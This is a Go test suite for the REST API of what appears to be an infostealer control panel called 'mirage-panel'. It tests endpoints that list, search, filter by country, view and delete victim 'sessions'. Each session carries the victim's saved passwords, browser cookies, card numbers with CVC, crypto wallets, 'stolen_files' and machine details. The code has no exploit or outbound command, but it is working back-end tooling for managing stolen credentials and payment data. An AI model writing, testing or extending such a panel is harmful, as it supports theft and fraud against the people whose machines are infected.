package api_test

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/go-chi/chi/v5"
	"github.com/google/uuid"
	"github.com/user/mirage-panel/internal/api"
	"github.com/user/mirage-panel/internal/auth"
)

func setupSessionsTestRouter(t *testing.T, d *sql.DB) (chi.Router, string) {
	t.Helper()
	jwtSecret := "test-secret"
	r := chi.NewRouter()

	userID := createTestUser(t, d, "sessionsuser", "testpass")
	token, _, err := auth.GenerateToken(userID, "admin", jwtSecret, "")
	if err != nil {
		t.Fatal(err)
	}

	api.SetupRoutes(r, d, jwtSecret, "*", nil, nil, nil)
	return r, token
}

func TestSessionsList_Empty(t *testing.T) {
	d := openTestDB(t)
	r, token := setupSessionsTestRouter(t, d)

	req := httptest.NewRequest(http.MethodGet, "/api/sessions", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}

	items := resp["items"].([]any)
	if len(items) != 0 {
		t.Errorf("expected 0 items, got %d", len(items))
	}
	if resp["total"].(float64) != 0 {
		t.Errorf("expected total=0, got %v", resp["total"])
	}
	if resp["page"].(float64) != 1 {
		t.Errorf("expected page=1, got %v", resp["page"])
	}
	if resp["pages"].(float64) != 0 {
		t.Errorf("expected pages=0, got %v", resp["pages"])
	}
}

func TestSessionsList_WithData(t *testing.T) {
	d := openTestDB(t)
	r, token := setupSessionsTestRouter(t, d)

	for i := 0; i < 5; i++ {
		id := uuid.New().String()
		_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
			VALUES (?, 'b1', ?, 'win10', 'user', '1.2.3.4', 'US', datetime('now'))`,
			id, "hwid-"+id[:8])
		if err != nil {
			t.Fatal(err)
		}
	}

	req := httptest.NewRequest(http.MethodGet, "/api/sessions", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}

	items := resp["items"].([]any)
	if len(items) != 5 {
		t.Errorf("expected 5 items, got %d", len(items))
	}
	if resp["total"].(float64) != 5 {
		t.Errorf("expected total=5, got %v", resp["total"])
	}

	for _, item := range items {
		it := item.(map[string]any)
		if it["passwords_count"].(float64) != 0 {
			t.Errorf("expected passwords_count=0, got %v", it["passwords_count"])
		}
		if it["country_code"] != "US" {
			t.Errorf("expected country_code=US, got %v", it["country_code"])
		}
	}
}

func TestSessionsList_Pagination(t *testing.T) {
	d := openTestDB(t)
	r, token := setupSessionsTestRouter(t, d)

	for i := 0; i < 5; i++ {
		id := uuid.New().String()
		_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
			VALUES (?, 'b1', ?, 'win10', 'user', '1.2.3.4', 'US', datetime('now', ?))`,
			id, "hwid-"+id[:8], fmt.Sprintf("-%d days", i))
		if err != nil {
			t.Fatal(err)
		}
	}

	req := httptest.NewRequest(http.MethodGet, "/api/sessions?page=1&limit=2", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}

	items := resp["items"].([]any)
	if len(items) != 2 {
		t.Errorf("expected 2 items, got %d", len(items))
	}
	if resp["total"].(float64) != 5 {
		t.Errorf("expected total=5, got %v", resp["total"])
	}
	if resp["page"].(float64) != 1 {
		t.Errorf("expected page=1, got %v", resp["page"])
	}
	if resp["pages"].(float64) != 3 {
		t.Errorf("expected pages=3, got %v", resp["pages"])
	}
}

func TestSessionsList_FilterByCountry(t *testing.T) {
	d := openTestDB(t)
	r, token := setupSessionsTestRouter(t, d)

	sessions := []struct {
		id      string
		country string
	}{
		{uuid.New().String(), "US"},
		{uuid.New().String(), "RU"},
		{uuid.New().String(), "RU"},
		{uuid.New().String(), "GB"},
		{uuid.New().String(), "DE"},
	}

	for _, s := range sessions {
		_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
			VALUES (?, 'b1', 'hwid', 'win10', 'user', '1.2.3.4', ?, datetime('now'))`,
			s.id, s.country)
		if err != nil {
			t.Fatal(err)
		}
	}

	req := httptest.NewRequest(http.MethodGet, "/api/sessions?country=RU", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}

	items := resp["items"].([]any)
	if len(items) != 2 {
		t.Errorf("expected 2 items for RU, got %d", len(items))
	}
	if resp["total"].(float64) != 2 {
		t.Errorf("expected total=2, got %v", resp["total"])
	}

	for _, item := range items {
		it := item.(map[string]any)
		if it["country_code"] != "RU" {
			t.Errorf("expected country_code=RU, got %v", it["country_code"])
		}
	}
}

func TestSessionsList_FilterBySearch(t *testing.T) {
	d := openTestDB(t)
	r, token := setupSessionsTestRouter(t, d)

	id := uuid.New().String()
	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
		VALUES (?, 'b1', 'hwid-1', 'DESKTOP-ABC', 'alice', '192.168.1.1', 'US', datetime('now'))`,
		id)
	if err != nil {
		t.Fatal(err)
	}
	for i := 0; i < 4; i++ {
		otherID := uuid.New().String()
		_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
			VALUES (?, 'b1', ?, 'win10', 'user', '10.0.0.1', 'US', datetime('now'))`,
			otherID, "hwid-"+otherID[:8])
		if err != nil {
			t.Fatal(err)
		}
	}

	req := httptest.NewRequest(http.MethodGet, "/api/sessions?q=DESKTOP", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}

	items := resp["items"].([]any)
	if len(items) != 1 {
		t.Errorf("expected 1 item matching DESKTOP, got %d", len(items))
	}
	if resp["total"].(float64) != 1 {
		t.Errorf("expected total=1, got %v", resp["total"])
	}
}

func TestSessionsList_SortAsc(t *testing.T) {
	d := openTestDB(t)
	r, token := setupSessionsTestRouter(t, d)

	ids := make([]string, 5)
	for i := 0; i < 5; i++ {
		ids[i] = uuid.New().String()
		_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
			VALUES (?, 'b1', ?, 'win10', 'user', '1.2.3.4', 'US', datetime('now', ?))`,
			ids[i], "hwid-"+ids[i][:8], fmt.Sprintf("-%d days", i))
		if err != nil {
			t.Fatal(err)
		}
	}

	req := httptest.NewRequest(http.MethodGet, "/api/sessions?sort=+created_at&limit=5", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}

	items := resp["items"].([]any)
	if len(items) != 5 {
		t.Fatalf("expected 5 items, got %d", len(items))
	}

	first := items[0].(map[string]any)
	last := items[4].(map[string]any)
	if first["created_at"].(string) > last["created_at"].(string) {
		t.Error("expected ascending sort by created_at")
	}
}

func TestSessionsList_SortDesc(t *testing.T) {
	d := openTestDB(t)
	r, token := setupSessionsTestRouter(t, d)

	ids := make([]string, 5)
	for i := 0; i < 5; i++ {
		ids[i] = uuid.New().String()
		_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
			VALUES (?, 'b1', ?, 'win10', 'user', '1.2.3.4', 'US', datetime('now', ?))`,
			ids[i], "hwid-"+ids[i][:8], fmt.Sprintf("-%d days", i))
		if err != nil {
			t.Fatal(err)
		}
	}

	req := httptest.NewRequest(http.MethodGet, "/api/sessions?sort=-created_at&limit=5", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}

	items := resp["items"].([]any)
	if len(items) != 5 {
		t.Fatalf("expected 5 items, got %d", len(items))
	}

	first := items[0].(map[string]any)
	last := items[4].(map[string]any)
	if first["created_at"].(string) < last["created_at"].(string) {
		t.Error("expected descending sort by created_at")
	}
}

func TestSessionsList_InvalidSort(t *testing.T) {
	d := openTestDB(t)
	r, token := setupSessionsTestRouter(t, d)

	req := httptest.NewRequest(http.MethodGet, "/api/sessions?sort=invalid", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]string
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}
	if resp["error"] == "" {
		t.Error("expected error message")
	}
}

func TestSessionsDetail_Existing(t *testing.T) {
	d := openTestDB(t)
	r, token := setupSessionsTestRouter(t, d)

	sessionID := uuid.New().String()
	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
		VALUES (?, 'build-1', 'hwid-001', 'win10', 'alice', '192.168.1.1', 'US', datetime('now'))`,
		sessionID)
	if err != nil {
		t.Fatal(err)
	}

	_, err = d.Exec(`INSERT INTO passwords (id, session_id, url, username, password_value, browser)
		VALUES (?, ?, 'https://example.com', 'alice@example.com', 'secret123', 'chrome')`,
		uuid.New().String(), sessionID)
	if err != nil {
		t.Fatal(err)
	}

	_, err = d.Exec(`INSERT INTO cookies (id, session_id, domain, name, value, path)
		VALUES (?, ?, 'example.com', 'sessionid', 'abc123', '/')`,
		uuid.New().String(), sessionID)
	if err != nil {
		t.Fatal(err)
	}

	_, err = d.Exec(`INSERT INTO cards (id, session_id, number, exp_month, exp_year, holder, cvc)
		VALUES (?, ?, '4111111111111111', '12', '28', 'Alice', '123')`,
		uuid.New().String(), sessionID)
	if err != nil {
		t.Fatal(err)
	}

	_, err = d.Exec(`INSERT INTO wallets (id, session_id, name, path)
		VALUES (?, ?, 'MetaMask', '/path/to/wallet')`,
		uuid.New().String(), sessionID)
	if err != nil {
		t.Fatal(err)
	}

	_, err = d.Exec(`INSERT INTO stolen_files (id, session_id, filename, size)
		VALUES (?, ?, 'passwords.txt', 1024)`,
		uuid.New().String(), sessionID)
	if err != nil {
		t.Fatal(err)
	}

	_, err = d.Exec(`INSERT INTO system_info (session_id, cpu, gpu, ram, os, screen, hostname, local_ip, mac, public_ip, hwid, uptime)
		VALUES (?, 'Intel i7', 'NVIDIA RTX 3080', '32GB', 'Windows 10', '1920x1080', 'DESKTOP-ABC', '192.168.1.1', '00:11:22:33:44:55', '8.8.8.8', 'hwid-001', '2h 15m')`,
		sessionID)
	if err != nil {
		t.Fatal(err)
	}

	req := httptest.NewRequest(http.MethodGet, "/api/sessions/"+sessionID, nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}

	if resp["id"] != sessionID {
		t.Errorf("expected id=%s, got %v", sessionID, resp["id"])
	}
	if resp["os"] != "win10" {
		t.Errorf("expected os=win10, got %v", resp["os"])
	}
	if resp["country_code"] != "US" {
		t.Errorf("expected country_code=US, got %v", resp["country_code"])
	}

	passwords := resp["passwords"].([]any)
	if len(passwords) != 1 {
		t.Errorf("expected 1 password, got %d", len(passwords))
	}
	cookies := resp["cookies"].([]any)
	if len(cookies) != 1 {
		t.Errorf("expected 1 cookie, got %d", len(cookies))
	}
	cards := resp["cards"].([]any)
	if len(cards) != 1 {
		t.Errorf("expected 1 card, got %d", len(cards))
	}
	wallets := resp["wallets"].([]any)
	if len(wallets) != 1 {
		t.Errorf("expected 1 wallet, got %d", len(wallets))
	}
	files := resp["files"].([]any)
	if len(files) != 1 {
		t.Errorf("expected 1 file, got %d", len(files))
	}

	sysInfo := resp["system_info"].(map[string]any)
	if sysInfo == nil {
		t.Fatal("expected system_info to be non-nil")
	}
	if sysInfo["hostname"] != "DESKTOP-ABC" {
		t.Errorf("expected hostname=DESKTOP-ABC, got %v", sysInfo["hostname"])
	}
}

func TestSessionsDetail_NotFound(t *testing.T) {
	d := openTestDB(t)
	r, token := setupSessionsTestRouter(t, d)

	req := httptest.NewRequest(http.MethodGet, "/api/sessions/"+uuid.New().String(), nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusNotFound {
		t.Fatalf("expected 404, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]string
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}
	if resp["error"] == "" {
		t.Error("expected error message")
	}
}

func TestSessionsDelete_Existing(t *testing.T) {
	d := openTestDB(t)
	r, token := setupSessionsTestRouter(t, d)

	sessionID := uuid.New().String()
	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
		VALUES (?, 'build-1', 'hwid-001', 'win10', 'alice', '192.168.1.1', 'US', datetime('now'))`,
		sessionID)
	if err != nil {
		t.Fatal(err)
	}

	passID := uuid.New().String()
	_, err = d.Exec(`INSERT INTO passwords (id, session_id, url, username, password_value, browser)
		VALUES (?, ?, 'https://example.com', 'alice', 'secret', 'chrome')`,
		passID, sessionID)
	if err != nil {
		t.Fatal(err)
	}

	req := httptest.NewRequest(http.MethodDelete, "/api/sessions/"+sessionID, nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var count int
	err = d.QueryRow("SELECT COUNT(*) FROM sessions WHERE id = ?", sessionID).Scan(&count)
	if err != nil {
		t.Fatal(err)
	}
	if count != 0 {
		t.Error("expected session to be deleted")
	}

	err = d.QueryRow("SELECT COUNT(*) FROM passwords WHERE session_id = ?", sessionID).Scan(&count)
	if err != nil {
		t.Fatal(err)
	}
	if count != 0 {
		t.Error("expected passwords to be cascade deleted")
	}
}

func TestSessionsDelete_NotFound(t *testing.T) {
	d := openTestDB(t)
	r, token := setupSessionsTestRouter(t, d)

	req := httptest.NewRequest(http.MethodDelete, "/api/sessions/"+uuid.New().String(), nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusNotFound {
		t.Fatalf("expected 404, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]string
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}
	if resp["error"] == "" {
		t.Error("expected error message")
	}
}

func TestSessionsList_SearchByIP(t *testing.T) {
	d := openTestDB(t)
	r, token := setupSessionsTestRouter(t, d)

	sessions := []struct {
		id string
		ip string
	}{
		{uuid.New().String(), "192.168.1.1"},
		{uuid.New().String(), "10.0.0.1"},
		{uuid.New().String(), "192.168.1.2"},
		{uuid.New().String(), "172.16.0.1"},
		{uuid.New().String(), "192.168.1.3"},
	}

	for _, s := range sessions {
		_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
			VALUES (?, 'b1', 'hwid', 'win10', 'user', ?, 'US', datetime('now'))`,
			s.id, s.ip)
		if err != nil {
			t.Fatal(err)
		}
	}

	req := httptest.NewRequest(http.MethodGet, "/api/sessions?q=192.168", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}

	items := resp["items"].([]any)
	if len(items) != 3 {
		t.Errorf("expected 3 items matching 192.168, got %d", len(items))
	}
	if resp["total"].(float64) != 3 {
		t.Errorf("expected total=3, got %v", resp["total"])
	}
}

func TestSessionsList_SearchByHWID(t *testing.T) {
	d := openTestDB(t)
	r, token := setupSessionsTestRouter(t, d)

	ids := []string{uuid.New().String(), uuid.New().String(), uuid.New().String()}
	hwids := []string{"HWID-001", "HWID-002", "OTHER-003"}
	for i := range ids {
		_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
			VALUES (?, 'b1', ?, 'win10', 'user', '1.2.3.4', 'US', datetime('now'))`,
			ids[i], hwids[i])
		if err != nil {
			t.Fatal(err)
		}
	}

	req := httptest.NewRequest(http.MethodGet, "/api/sessions?q=HWID", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}

	items := resp["items"].([]any)
	if len(items) != 2 {
		t.Errorf("expected 2 items matching HWID, got %d", len(items))
	}
	if resp["total"].(float64) != 2 {
		t.Errorf("expected total=2, got %v", resp["total"])
	}
}
